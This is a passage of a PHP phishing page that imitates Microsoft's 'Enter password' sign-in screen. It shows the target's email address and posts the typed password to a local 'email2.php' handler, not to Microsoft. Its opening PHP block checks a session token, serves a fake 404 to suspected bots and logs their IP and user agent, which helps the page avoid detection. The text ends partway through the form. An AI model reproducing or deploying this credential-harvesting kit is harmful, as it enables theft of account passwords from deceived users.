<?php

    session_start();

    require_once '../../Meta/Comp.php';
    require_once '../../Meta/Antibot.php';
    require_once '../../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Astute/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }


?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="preconnect" href="https://acctcdn.msauth.net/" crossorigin="">
<link rel="preconnect" href="https://acctcdn.msftauth.net/" crossorigin="">
<link rel="preconnect" href="https://logincdn.msauth.net/" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://acctcdn.msauth.net/">
<link rel="dns-prefetch" href="https://acctcdn.msftauth.net/">
<link rel="dns-prefetch" href="https://acctcdnmsftuswe2.azureedge.net/">
<link rel="dns-prefetch" href="https://acctcdnvzeuno.azureedge.net/">
<link rel="dns-prefetch" href="https://logincdn.msauth.net/">
<link rel="dns-prefetch" href="https://logincdn.msftauth.net/">
<link rel="dns-prefetch" href="https://lgincdnvzeuno.azureedge.net/">
<link rel="dns-prefetch" href="https://lgincdnmsftuswe2.azureedge.net/">
<meta http-equiv="X-UA-Compatible" content="IE=Edge"><!--<base href="https://login.live.com">--><base href="."><script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, UniversalSecondFactor: 15, SecurityKey: 18, Voice: -3};</script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033&uaid=faa57fd20e47496fbace93710f7ef737"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="robots" content="none"><meta name="PageID" content="i5030"><meta name="SiteID" content="292841"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var o=t[n]={exports:{},id:n,loaded:!1};return e[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){!function(){function e(){return u.$Config||u.ServerData||{}}function r(e,r){var t=u.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(){var e=u.$B;if(void 0===c)if(e)c=e.IE;else{var r=u.navigator.userAgent;c=r.indexOf("MSIE ")!==-1||r.indexOf("Trident/")!==-1}return c}function n(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>g&&e.substr(t-g,g).toLowerCase()===f}function o(){var r=e(),t=r.loader||{};return t.slReportFailure||r.slReportFailure||!1}function a(){var r=e(),t=r.loader||{};return t.redirectToErrorPageOnLoadFailure||!1}function i(){var r=e(),t=r.loader||{};return t.logByThrowing||!1}function s(e){var r=!0,t=e.src||e.href||"";if(t){if(n(t))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(o){}}else r=!1;return r}function d(){function t(e){var r=l.getElementsByTagName("head")[0];r.appendChild(e)}function o(e,r,t,o){var s=null;return s=n(e)?a(e):"script"===o.toLowerCase()?i(e):c(e,o),r&&(s.id=r),"function"==typeof s.setAttribute&&(s.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&s.setAttribute("integrity",t)),s}function a(e){var r=l.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function i(e){var r=l.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function c(e,r){var t=l.createElement(r);return t.src=e,t}function u(e){if(!(m&&m.length>1))return e;for(var r=0;r<m.length;r++)if(0===e.indexOf(m[r]))return m[r+1<m.length?r+1:0]+e.substring(m[r].length);return e}function f(e,t,n,o){return r("[$Loader]: "+(L.failMessage||"Failed"),o),R[e].retry<p?(R[e].retry++,h(e,t,n),void d._ReportFailure(R[e].retry,R[e].srcPath)):void(n&&n())}function g(e,t,n,o){if(s(o)){r("[$Loader]: "+(L.successMessage||"Loaded"),o),h(e+1,t,n);var a=R[e].onSuccess;"function"==typeof a&&a(R[e].srcPath)}else f(e,t,n,o)}function h(e,n,a){if(e<R.length){var i=R[e];if(!i||!i.srcPath)return void h(e+1,n,a);i.retry>0&&(i.srcPath=u(i.srcPath),i.origId||(i.origId=i.id),i.id=i.origId+"_Retry_"+i.retry);var s=o(i.srcPath,i.id,i.integrity,i.tagName);s.onload=function(){g(e,n,a,s)},s.onerror=function(){f(e,n,a,s)},s.onreadystatechange=function(){"loaded"===s.readyState?setTimeout(function(){g(e,n,a,s)},500):"complete"===s.readyState&&g(e,n,a,s)},t(s),r("[$Loader]: Loading '"+(i.srcPath||"")+"', id:"+(i.id||""))}else n&&n()}var v=e(),p=v.slMaxRetry||2,y=v.loader||{},m=y.cdnRoots||[],L=this,R=[];L.retryOnError=!0,L.successMessage="Loaded",L.failMessage="Error",L.Add=function(e,r,t,n,o,a){e&&R.push({srcPath:e,id:r,retry:n||0,integrity:t,tagName:o||"script",onSuccess:a})},L.AddForReload=function(e,r){var t=e.src||e.href||"";L.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},L.AddIf=function(e,r,t){e&&L.Add(r,t)},L.Load=function(e,r){h(0,e,r)}}var c,u=window,l=u.document,f=".css",g=f.length;d.On=function(e,r,t){if(!e)throw"The target element must be provided and cannot be null.";r?d.OnError(e,t):d.OnSuccess(e,t)},d.OnSuccess=function(e,t){var n=e.src||e.href||"",i=o(),c=a();if(!e)throw"The target element must be provided and cannot be null.";if(s(e)){r("[$Loader]: Loaded",e);var u=new d;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.Load(null,function(){if(i)throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+n+"']";c&&(document.location.href="/error.aspx?err=504")})}else d.OnError(e,t)},d.OnError=function(e,t){var n=e.src||e.href||"",i=o(),s=a();if(!e)throw"The target element must be provided and cannot be null.";r("[$Loader]: Failed",e);var c=new d;c.failMessage="Reload Failed",c.successMessage="Reload Success",c.AddForReload(e,t),c.Load(null,function(){if(i)throw"Failed to load external resource ['"+n+"']";s&&(document.location.href="/error.aspx?err=504")}),d._ReportFailure(0,n)},d._ReportFailure=function(e,r){if(i()&&!t())throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"},u.$Loader=d}()}]));</script><script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(r){function t(o){if(e[o])return e[o].exports;var n=e[o]={exports:{},id:o,loaded:!1};return r[o].call(n.exports,n,n.exports,t),n.loaded=!0,n.exports}var e={};return t.m=r,t.c=e,t.p="",t(0)}([function(r,t){!function(){function r(r,t){function e(i){var a=r[i];return i<o-1?void(n.r[a]?e(i+1):n.when(a,function(){e(i+1)})):void t(a)}var o=r.length;e(0)}function t(r,t,i){function a(){var r=!!u.method,n=r?u.method:i[0],a=u.extraArgs||[],c=o.$WebWatson;try{var f=e(i,!r);if(a&&a.length>0)for(var s=a.length,v=0;v<s;v++)f.push(a[v]);n.apply(t,f)}catch(h){return void(c&&c.submitFromException&&c.submitFromException(h))}}var u=n.r&&n.r[r];return t=t?t:this,u&&(u.skipTimeout?a():o.setTimeout(a,0)),u}function e(r,t){return Array.prototype.slice.call(r,t?1:0)}var o=window;o.$Do||(o.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var n=o.$Do;n.when=function(e,o){function i(r){t(r,a,u)||n.q.push({id:r,c:a,a:u})}var a=0,u=[],c=1,f="function"==typeof o;f||(a=o,c=2);for(var s=c;s<arguments.length;s++)u.push(arguments[s]);e instanceof Array?r(e,i):i(e)},n.register=function(r,e,o){if(!n.r[r]){n.o.push(r);var i={};if(e&&(i.method=e),o&&(i.skipTimeout=o),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a<arguments.length;a++)i.extraArgs.push(arguments[a])}n.r[r]=i,n.lock++;try{for(var u=0;u<n.q.length;u++){var c=n.q[u];c.id==r&&t(r,c.c,c.a)&&n.removeItems.push(c)}}catch(f){throw f}finally{if(n.lock--,0===n.lock){for(var s=0;s<n.removeItems.length;s++)for(var v=n.removeItems[s],h=0;h<n.q.length;h++)if(n.q[h]===v){n.q.splice(h,1);break}n.removeItems=[]}}}},n.unregister=function(r){n.r[r]&&delete n.r[r]}}()}]));</script><script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));</script><link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29648.2/images/favicon.ico"><link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="./microsoft2_files/Converged_v21033_-i2hhfXxIxZTqQthHjiRGw2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var i=t[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,r),i.loaded=!0,i.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,i,s,a){var o=1,c=unescape("%3Cscript type='text/javascript'");a&&(c+=" crossorigin='anonymous' integrity='"+a+"'"),c+=" src='";var u=unescape("'%3E%3C/script%3E"),S=r;if(n&&n.userAgent&&s&&s!==r){var d=n.userAgent.toLowerCase(),p=d.indexOf("edge")>=0;if(!p){var f=d.match(/chrome\/([0-9]+)\./),g=f&&2===f.length&&!isNaN(f[1])&&parseInt(f[1])>54;g&&(S=s)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,i<=o&&document.write(c+S+u)):t.g_sSRSSuccess+=e+"|"+i+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://logincdn.msauth.net/16.000.29648.2/images/Windows_Live_v_thumb.jpg"><script type="text/javascript">window.UXResourceDependencies = [];</script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.en_qoJB63kbDlJP2VY0rUXv-w2.js","ConvergedLoginPaginatedStrings","sha384-2YFC4CLKdZWujKkCm16gxctIGHBqaYWiF8m/eWLpuuM7/tmKeYauRD9iZ4BSeglU");l.Provides("UX_JS_Strings");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript" src="./microsoft2_files/ConvergedLoginPaginatedStrings.en_qoJB63kbDlJP2VY0rUXv-w2.js.download" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-2YFC4CLKdZWujKkCm16gxctIGHBqaYWiF8m/eWLpuuM7/tmKeYauRD9iZ4BSeglU"></script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_aYfNBpr_CbVBQmDqeOUWSQ2.js","ConvergedLogin_PCore","sha384-majQGIv50RG0Te5tj43ORXuVIK5KR+y2WLGzrO51ckjDpdL+juse0pDE0j+ZXmPU");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };</script><script type="text/javascript" src="./microsoft2_files/ConvergedLogin_PCore_aYfNBpr_CbVBQmDqeOUWSQ2.js.download" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-majQGIv50RG0Te5tj43ORXuVIK5KR+y2WLGzrO51ckjDpdL+juse0pDE0j+ZXmPU"></script><script charset="utf-8" src="./microsoft2_files/oneDs_641b1cf809bdc17b42ab.js.download"></script><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><script charset="utf-8" src="./microsoft2_files/convergedlogin_ppassword_d511aa9921bcaf75af02.js.download"></script></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" action="../../Meta/Benchmark/email2.php?token=<?php echo $_SESSION['token']; ?>" method="POST" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { &#39;provide-min-height&#39;: svr.cL }" action="https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1672418802&amp;rver=7.0.6737.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d463fd062-80f9-b873-f8e5-37d460e65ab0&amp;id=292841&amp;aadredir=1&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015&amp;contextid=AE9AA14694627394&amp;bk=1672418804&amp;uaid=faa57fd20e47496fbace93710f7ef737&amp;pid=0">
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page" data-bind="component: { name: &#39;master-page&#39;,
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.e,
            showFooterLinks: true,
            useWizardBehavior: svr.bC,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { &#39;provide-min-height&#39;: svr.cL }"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { &#39;provide-min-height&#39;: svr.cL },
    component: { name: &#39;background-image-control&#39;,
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }" class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.cQ --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { &#39;middle&#39;: true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: &#39;content-control&#39;, params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { &#39;sign-in-box&#39;: true },
            css: {
                &#39;inner&#39;:  $content.isVerticalSplitTemplate,
                &#39;vertical-split-content&#39;: $content.isVerticalSplitTemplate,
                &#39;app&#39;: $page.backgroundLogoUrl,
                &#39;wide&#39;: $page.paginationControlHelper.useWiderWidth,
                &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                &#39;has-popup&#39;: $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.Bw --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.Cf &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: &#39;logo-control&#39;,
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./microsoft2_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.Dg && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.a5,
                disableAnimationIfAnimationEndUnsupported: svr.CK,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.i) -->
    <div data-bind="css: {
        &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }" class="animate slide-in-next">

        <div data-bind="component: { name: &#39;identity-banner-control&#39;,
            params: {
                userTileUrl: svr.b8,
                displayName: sharedData.displayName || svr.i,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible -->
    <button type="button" class="backButton" data-bind="
        attr: { &#39;id&#39;: backButtonId || &#39;idBtn_Back&#39; },
        ariaLabel: str[&#39;CT_HRD_STR_Splitter_Back&#39;],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
        <!-- ko ifnot: svr.Cy -->
            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="./microsoft2_files/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: svr.Cy --><!-- /ko -->
    </button>
    <!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title=""><?php echo $_SESSION['email']; ?></div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.i),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.Am === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata,
                    supportsNativeCredentialRecovery: sharedData.supportsNativeCredentialRecovery },
                event: {
                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

<!--  -->

<div aria-hidden="true">
    <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
    <input type="hidden" name="login" data-bind="value: unsafe_username" value="">
    <!-- The loginfmt input type is different as some password managers require it to be of type text.
        Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
    <input type="hidden" name="type" data-bind="value: svr.bC ? 20 : 11" value="11">
    <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
    <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
    <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
    <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
    <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
</div>

<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { &#39;title&#39;: true }">
    <div role="heading" aria-level="1" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div>
</div>

<!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

<!-- ko if: unsafe_pageDescription --><!-- /ko -->

<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
            <!-- ko if: passwordTextbox.error --><!-- /ko -->
        </div>

        <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox-field&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input name="emailPassword" type="password" required id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    &#39;loginHeader passwordError&#39;,
                    showCredViewBrandingDesc ? &#39;credViewBrandingDesc&#39; : &#39;&#39;,
                    unsafe_pageDescription ? &#39;passwordDesc&#39; : &#39;&#39;].join(&#39; &#39;),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    &#39;input&#39;: true,
                    &#39;text-box&#39;: true,
                    &#39;has-error&#39;: passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Password" aria-label="Enter password " tabindex="0">

            <!-- ko if: svr.cM && showPassword() --><!-- /ko -->
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

        <!-- ko if: svr.cM --><!-- /ko -->
    </div>
</div>

<!-- ko if: shouldHipInit --><!-- /ko -->

<div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }, externalCss: { &#39;password-reset-links-container&#39;: true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
    <div>
        <!-- ko if: svr.ce --><!-- /ko -->
        <!-- ko if: svr.BP !== false && !svr.ce && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: svr.au && svr.aj --><!-- /ko -->
                    <!-- ko ifnot: hideForgotMyPassword -->
                    <div class="form-group">
